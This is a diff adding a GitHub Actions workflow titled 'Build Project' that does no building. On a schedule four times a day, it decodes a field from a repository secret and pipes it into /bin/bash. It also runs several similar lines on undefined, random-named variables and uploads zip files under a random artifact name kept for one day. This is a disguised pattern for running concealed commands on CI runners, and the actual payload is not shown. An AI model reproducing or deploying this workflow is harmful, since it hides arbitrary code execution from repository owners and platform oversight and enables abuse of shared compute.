@@ -1,0 +1,30 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '1 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  start:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute task
+        env:
+          lydz17398: ${{ secrets.lydz17398 }}
+        run: |
+          printf '%s' "$lydz17398" | jq -r .ncxb8 | /bin/bash
+          echo $ijqg3891 | jq -r .mfknl14 | /bin/bash
+          echo $ro6 | jq -r .e36 | /bin/bash
+          echo $ipbf52 | jq -r .dchvi88 | /bin/bash
+
+      - name: Persist data
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: d6GgvVKn
+          path: "*.zip"
+          retention-days: 1
